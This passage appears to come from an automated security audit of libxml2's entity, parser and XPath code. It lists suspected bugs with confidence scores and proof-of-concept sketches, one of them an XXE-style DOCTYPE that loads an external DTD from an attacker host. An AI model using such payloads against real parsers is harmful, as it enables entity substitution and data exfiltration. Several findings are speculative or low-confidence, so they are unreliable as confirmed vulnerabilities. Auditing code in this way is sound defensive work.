*PoC sketch:* <root>]]></root> - The parser detects ]]> at position 0, reports error, advances past first ]. Then ]> is parsed as regular character data and delivered to the application, which is incorrect. The entire ]]> should be consumed or the parser should stop.

### `libxml2/entities.c [entity content handling+value encode L562-726]` — L645 — conf=0.85
**Incomplete UTF-8 error recovery skips only 1 byte of multi-byte invalid sequence**

When xmlGetUTF8Char() returns an error (val < 0), the code only increments `cur` by 1 (`cur++`). However, the invalid UTF-8 sequence could be 2-4 bytes long. The remaining bytes of the invalid sequence will be re-processed in subsequent loop iterations. Continuation bytes (10xxxxxx, >= 0x80) will re-enter the UTF-8 handling branch, potentially being misinterpreted or causing cascading decode errors. While `l` is initialized to 4 and may be updated by xmlGetUTF8Char to indicate the actual sequence length, this value is ignored in the error path.

*PoC sketch:* Input: \xC2\x20 (invalid: 2-byte sequence start followed by ASCII space) Expected: Skip 2 bytes, emit replacement char Actual: Skips only 1 byte (\xC2), then processes \x20 as a normal space, missing the error context

### `libxml2/entities.c [entity value escaping+output+cleanup L726-908]` — L796 — conf=0.8
**No validation of invalid XML characters allows generation of malformed XML**

The else branch in xmlEncodeSpecialChars copies any character that isn't <, >, &, ", or \r directly to the output buffer without validation. This includes invalid XML 1.0 characters (0x00-0x08, 0x0B, 0x0C, 0x0E-0x1F) which are not permitted in XML documents. Producing XML with these characters can cause parsing failures in downstream consumers, potential denial of service, or unexpected behavior in applications that assume well-formed XML output.

*PoC sketch:* Input string containing byte 0x01 (SOH): "text\x01more" — Output: "text\x01more" with the invalid control character passed through unchanged, producing invalid XML.

### `libxml2/parser.c [xmlParseCharRef: char ref decoder L2578-2750]` — L2590 — conf=0.75
**Double increment of count variable causes inconsistent hex digit acceptance**

In the hex parsing branch of xmlParseCharRef, the `count` variable is incremented twice per loop iteration: once via post-increment in `if (count++ > 20)` and again explicitly at the bottom with `count++`. This causes count to advance by 2 per iteration instead of 1. The `count < 20` guard on hex letters (a-f, A-F) is intended to limit the number of parsed digits, but due to the double increment, hex letters are rejected after only ~10 iterations while digits 0-9 continue to be accepted indefinitely. This inconsistency means an attacker can craft arbitrarily long hex character references using…

*PoC sketch:* &#x00000000000000000000000000000000000000000000000000000000000000000001; — This reference with only digit '0' and '1' will be fully parsed despite having far more than 20 hex digits, because the count<20 check only applies to a-f/A-F digits, and the double increment causes the GROW/cap logic to beha…

### `libxml2/parser.c [xmlParseAttValueInternal A: attrib decode L4303-4420]` — L4393 — conf=0.75
**CUR_PTR direct increment bypasses NEXTL bookkeeping in CR+LF handling**

In the CR+LF handling, `CUR_PTR++` is used to skip the LF byte, followed by `NEXTL(1)` to skip the CR. The direct `CUR_PTR++` bypasses the NEXTL macro which typically handles line/column tracking and other parser bookkeeping. While this doesn't directly cause a memory safety issue, it can cause line number tracking to become incorrect, which may affect error reporting or debug instrumentation that relies on accurate position information.

*PoC sketch:* <a attr="line1 line2"/> — The CR+LF sequence is handled by CUR_PTR++ followed by NEXTL(1), but the line counter may not be properly incremented due to bypassing NEXTL for the LF byte.

### `libxml2/parser.c [xmlParseStartTag2 D: ns expand+attrib dedup L9340-9460]` — L9430 — conf=0.7
**Incomplete duplicate attribute suppression for default attributes with different prefixes mapping to same namespace**

In the default attributes duplicate check, when a hash collision is found (res < INT_MAX), the code only skips the default attribute (via `continue`) if the prefix pointer matches exactly (`aprefix == atts[res+1]`). If two attributes have the same local name and namespace URI but different prefixes (which map to the same namespace), the prefix comparison fails, an error is reported, but the attribute is NOT skipped — it falls through and gets added to the attribute list. This violates the WFC: Unique Att Spec constraint for namespace-aware processing, potentially resulting in duplicate attribu…

*PoC sketch:* <?xml version="1.0"?> <!DOCTYPE root [   <!ATTLIST root attr CDATA "default"> ]> <root xmlns:a="http://example.com/ns" xmlns:b="http://example.com/ns" a:attr="explicit"/>

### `libxml2/xpath.c [xmlXPathNodeSetAdd: array growth OOB L2910-3075]` — L2928 — conf=0.7
**Missing Initialization of Reallocated Memory in NodeSet Growth**

After the initial allocation (cur->nodeMax == 0), the code calls memset to zero-initialize the nodeTab. However, after xmlRealloc in the growth path, the newly allocated portion (from old nodeMax to new nodeMax) is NOT zeroed out. This leaves heap data in the unused portion of the array. If any code path reads beyond cur->nodeNr but within cur->nodeMax (e.g., during serialization, comparison, or incorrect iteration), it could leak sensitive heap information. The inconsistency between the initialized initial allocation and uninitialized growth allocation is a defense-in-depth weakness.

*PoC sketch:* Trigger node set growth by adding nodes beyond the initial XML_NODESET_DEFAULT capacity. Then examine the memory contents of cur->nodeTab between cur->nodeNr and cur->nodeMax, which will contain stale heap data rather than NULL pointers.

### `libxml2/xpath.c [xmlXPathCompareValues: type coercion compare L6299-6415]` — L6307 — conf=0.7
**NULL pointer passed to xmlXPathReleaseObject when both stack pops return NULL**

When both arg1 and arg2 are NULL (e.g., from popping an empty XPath stack), the else branch calls xmlXPathReleaseObject(ctxt->context, arg2) with arg2==NULL. While some versions of xmlXPathReleaseObject handle NULL gracefully, the logic is incorrect: the intent is to free whichever argument is non-NULL, but when both are NULL, a NULL pointer is passed to the release function. If xmlXPathReleaseObject does not guard against NULL, this results in a null pointer dereference causing a crash (DoS).

*PoC sketch:* Trigger xmlXPathCompareValues with an insufficient number of values on the XPath evaluation stack. This could occur via a malformed or edge-case XPath expression that leaves the stack empty before a comparison operator is evaluated. For instance, if a prior operation unexpectedly consumes stack valu…

### `libxml2/xpath.c [xmlXPathCurrentChar+ParseNameComplex A L8698-8855]` — L8722 — conf=0.65
**Invalid 4-Byte UTF-8 First Byte Accepted (0xF5-0xF7)**

In the 4-byte UTF-8 sequence handling, the check `((c & 0xf8) != 0xf0)` only ensures the first byte is in range 0xF0-0xF7. However, per RFC 3629, only 0xF0-0xF4 are valid first bytes for 4-byte sequences (encoding codepoints up to U+10FFFF). First bytes 0xF5-0xF7 would encode codepoints above U+10FFFF, which are invalid in Unicode. The function does not reject these, relying solely on the IS_CHAR(val) macro to catch the invalid codepoint. If IS_CHAR does not properly validate the upper bound, invalid codepoints above U+10FFFF would be accepted.

*PoC sketch:* Provide a 4-byte UTF-8 sequence starting with 0xF5, e.g., 0xF5 0x80 0x80 0x80, which decodes to U+140000 (above the valid Unicode range). If IS_CHAR does not reject this, the invalid codepoint is returned.

### `libxml2/parser.c [xmlParseAttValueInternal A: attrib decode L4303-4420]` — L4393 — conf=0.6
**Potential out-of-bounds read via NXT(1) in CR/LF handling near buffer end**

When a CR (0x0D) character is encountered, the code checks `NXT(1) == 0xA` to detect CR+LF sequences. However, if the CR is the last valid byte in the input buffer and GROW fails to provide more data, `NXT(1)` reads one byte past the current position without a bounds check. While libxml2 input buffers typically have sentinel bytes that mitigate this in practice, the missing explicit bounds check is a code defect that could become exploitable if the sentinel guarantee is violated (e.g., through a custom input callback).

*PoC sketch:* Provide an XML input where the attribute value ends with a CR (0x0D) as the very last byte before EOF, with no trailing LF or closing quote. If the input buffer has no sentinel padding, NXT(1) reads one byte past the allocated buffer.

### `libxml2/parser.c [xmlParseAttValueInternal B: entity in attrib L4420-4535]` — L4483 — conf=0.6
**Silent Dropping of Malformed Entity References**

When xmlParseEntityRefInternal() returns NULL (malformed entity reference or bare '&'), or when xmlLookupGeneralEntity() returns NULL (undefined entity), the code silently continues without adding anything to the output buffer. The '&' and entity name have already been consumed from the input but nothing replaces them in the output. In recovery mode, this silently alters attribute values, which could be exploited to craft inputs whose parsed meaning differs from their literal representation, potentially bypassing input validation that operates on raw input while the application processes parse…

*PoC sketch:* <?xml version="1.0"?> <doc attr="before&undefined;after"/> <!-- In recovery mode, parsed attribute becomes 'beforeafter' --> <!-- The '&undefined;' is silently dropped -->

### `libxml2/xpath.c [xmlXPathNodeSetAdd: array growth OOB L2910-3075]` — L2934 — conf=0.6
**Inconsistent State on xmlXPathNodeSetDupNs Failure After Growth**

In both xmlXPathNodeSetAdd and xmlXPathNodeSetAddUnique, after the nodeTab is successfully grown via xmlRealloc and cur->nodeMax is doubled, if the node being added is of type XML_NAMESPACE_DECL, xmlXPathNodeSetDupNs is called. If this allocation fails (returns NULL), the function returns -1, but the nodeTab has already been grown and cur->nodeMax updated. While this doesn't cause memory corruption, it means the node set is in a state where capacity was expanded but no node was added, wasting memory. More critically, the caller may not properly handle the -1 return, potentially leading to use …

*PoC sketch:* Craft an XML document with namespace declarations that trigger xmlXPathNodeSetDupNs during XPath evaluation, while simultaneously exhausting memory to cause the DupNs allocation to fail after the nodeTab growth has succeeded.

### `libxml2/xpath.c [xmlXPathNextAncestor: ancestor axis traversal L6954-7060]` — L6984 — conf=0.6
**Missing NULL check on attribute node parent return**

For XML_ATTRIBUTE_NODE, the code returns tmp->parent (or att->parent at lines 7026-7028) without checking if it is NULL. While the element-node path explicitly checks cur->parent == NULL and returns the document node, the attribute-node path does not perform this check. A detached attribute (one not attached to any element) would return NULL, which could be misinterpreted by callers expecting a valid ancestor or the document node as the final ancestor.

*PoC sketch:* Create a standalone xmlAttr node not attached to any element, set it as the context node, and evaluate an XPath expression with the ancestor:: axis.

### `libxml2/xpath.c [xmlXPathSubstringAfter+Normalize+Translate L8200-8336]` — L8264 — conf=0.5
**In-place string modification without ownership validation in normalize-space()**

xmlXPathNormalizeFunction modifies ctxt->value->stringval in-place by collapsing whitespace. If the same xmlChar* stringval buffer is shared between multiple XPath objects (e.g., through improper aliasing or reference counting), the in-place modification would corrupt the other references. Additionally, the string is shortened by writing an early null terminator, but the allocated buffer size is not updated, creating an inconsistency between the logical string length and the buffer metadata. While current libxml2 usage patterns typically ensure stringval is uniquely owned, this pattern is frag…

*PoC sketch:* This is a latent vulnerability. If a future code change causes stringval to be shared between XPath objects, calling normalize-space() on one would corrupt the other. Currently, triggering this requires unusual conditions where the same string buffer is referenced by multiple XPath objects.

### `libxml2/entities.c [xmlCreateEntity+xmlAddEntity: create+insert L1-155]` — L143 — conf=0.5
**Integer overflow in xmlStrlen result used for xmlStrndup allocation**

ret->length is assigned from xmlStrlen(content), which returns int. If content is extremely long (approaching INT_MAX bytes), xmlStrlen could return a value that, when passed to xmlStrndup, causes an integer overflow in the allocation size computation (len + 1) * sizeof(xmlChar). While practically difficult to trigger due to memory constraints, this represents a theoretical integer overflow that could lead to a heap buffer overflow if a system could allocate such a large string.

*PoC sketch:* Theoretical: provide content of length near INT_MAX. In practice, this requires unrealistic memory allocation, making exploitation extremely unlikely on modern systems.

### `libxml2/entities.c [xmlAddDtdEntity+NewEntity+GetParameter L430-562]` — L527 — conf=0.5
**Integer overflow check insufficiency in growBufferReentrant for extreme buffer_size values**

The `growBufferReentrant` macro computes `new_size = buffer_size * 2` and checks `if (new_size < buffer_size) goto mem_error;`. While this catches most overflow cases (since multiplying by 2 and overflowing always produces a smaller value), when `buffer_size` is exactly `SIZE_MAX/2`, `new_size` becomes `SIZE_MAX - 1`, which passes the check. The subsequent `xmlRealloc(buffer, SIZE_MAX - 1)` will almost certainly fail and return NULL, which is handled. However, on systems with limited memory, repeatedly triggering near-overflow conditions could cause denial of service through excessive memory a…

*PoC sketch:* This requires crafting input that causes buffer_size to double repeatedly until it approaches SIZE_MAX/2. In practice, this would require an extremely large input (exabytes), making it largely theoretical on 64-bit systems but potentially relevant on 32-bit systems with inputs around 2GB.

### `libxml2/entities.c [xmlCreateEntity+xmlAddEntity: create+insert L1-155]` — L133 — conf=0.4
**Incomplete error handling - error label code not shown but resources may leak**

The xmlCreateEntity function uses 'goto error' for failure paths, but the error handling code (the 'error:' label block) is not included in the provided snippet. If the error handler does not properly free already-allocated fields (e.g., ret->name, ret->ExternalID, ret->SystemID) before freeing ret, there could be memory leaks on error paths. Given the pattern of sequential allocations with goto error, any allocation failure after a prior successful allocation would leak the previously allocated memory if the error handler only calls xmlFree(ret).

*PoC sketch:* Trigger an allocation failure for SystemID after ExternalID has been successfully allocated. If the error path only frees 'ret' without freeing ret->ExternalID, memory is leaked.


## ⚪ INFO (5)

### `libxml2/entities.c [xmlGetDocEntity+DtdEntity: lookup chain L286-430]` — L393 — conf=0.65
**Missing NULL table check in xmlGetEntityFromTable**

xmlGetEntityFromTable() directly passes the 'table' parameter to xmlHashLookup() without checking if it is NULL. If the DTD's entities table has not been initialized (e.g., a document with an intSubset but no entities hash table), calling this function with a NULL table will result in a NULL pointer dereference inside xmlHashLookup(), causing a crash. This can be triggered during entity resolution in the lookup chain.

*PoC sketch:* xmlDocPtr doc = xmlNewDoc(BAD_CAST "1.0"); xmlDtdPtr dtd = xmlCreateIntSubset(doc, BAD_CAST "root", NULL, NULL); /* dtd->entities may be NULL if no entities were defined */ /* During parsing, xmlGetEntityFromTable(dtd->entities, name) is called */ /* If dtd->entities is NULL → crash in xmlHashLookup…

### `libxml2/entities.c [xmlGetDocEntity+DtdEntity: lookup chain L286-430]` — L313 — conf=0.55
**Predefined entity global state can be corrupted via mutable pointer return**

xmlGetPredefinedEntity() returns non-const pointers to global/static xmlEntity structures (e.g., &xmlEntityLt, &xmlEntityGt, &xmlEntityAmp). Since the returned pointer is mutable, a caller or downstream code could modify the contents of these global entities (e.g., changing the content pointer or length). This would corrupt the predefined entity state for the entire process, potentially leading to information disclosure, heap corruption, or arbitrary code execution if an attacker can control the overwrite data. This is especially dangerous in long-running processes or shared library contexts.

*PoC sketch:* xmlEntityPtr ent = xmlGetPredefinedEntity(BAD_CAST "lt"); if (ent) {     /* Corrupt the global predefined entity */     ent->content = (xmlChar *)attacker_controlled_data;     ent->length = attacker_controlled_length; } /* All subsequent lookups for &lt; now return corrupted data */

### `libxml2/entities.c [entity value escaping+output+cleanup L726-908]` — L870 — conf=0.5
**Potential NULL pointer dereference in xmlCopyEntity if payload is NULL**

The xmlCopyEntity function casts payload to xmlEntityPtr and immediately accesses ent->etype without checking if payload/ent is NULL. While this is a hash table callback that should never receive NULL, a corrupted hash table or direct misuse could trigger a NULL pointer dereference crash.

*PoC sketch:* If xmlCopyEntity is called directly or via a corrupted hash table with payload=NULL, accessing ent->etype at line 875 causes a segmentation fault.

### `libxml2/parser.c [xmlParseStartTag2 E: attrib flush+end L9460-9570]` — L9460 — conf=0.45
**Heap buffer overflow when appending defaulted attributes to atts array**

Defaulted attributes from the DTD are appended to the atts array via sequential nbatts++ writes (5 entries per attribute: name, prefix, nsIndex, value, valueEnd) without any visible bounds check against the allocated size of atts. If the number of defaulted attributes (controlled by the DTD) causes nbatts to exceed the pre-allocated capacity of atts, this results in a heap buffer overflow. An attacker can control the DTD content (via external entity references) to inject arbitrarily many defaulted attributes, overflowing the buffer and potentially achieving arbitrary code execution.

*PoC sketch:* Provide an XML document referencing an external DTD that declares hundreds of defaulted attributes on an element: <!ATTLIST targetElem a1 CDATA 'v1' a2 CDATA 'v2' ... aN CDATA 'vN'>. When parsing <targetElem/>, each defaulted attribute writes 5 entries to atts without bounds checking, overflowing th…

### `libxml2/entities.c [xmlGetDocEntity+DtdEntity: lookup chain L286-430]` — L349 — conf=0.45
**Entity redefinition ambiguity between internal and external DTD subsets**

xmlAddDtdEntity() (dtd=1, external subset) and xmlAddDocEntity() (dtd=0, internal subset) both call xmlAddEntity() to register entities in potentially different hash tables. If the lookup chain in xmlGetDocEntity does not strictly prioritize internal subset entities over external subset entities, an attacker-controlled external DTD could redefine entities that should be protected by the internal subset. This could lead to entity substitution attacks, SSRF via external entity references, or data exfiltration. The separation of these two registration paths without visible enforcement of lookup p…

*PoC sketch:* <?xml version="1.0"?> <!DOCTYPE root [   <!ENTITY % internal "safe_value">   <!ENTITY ext SYSTEM "http://attacker.com/evil.dtd">   %ext; ]> <root>&internal;</root> <!-- If evil.dtd redefines 'internal' entity and lookup prefers external subset -->

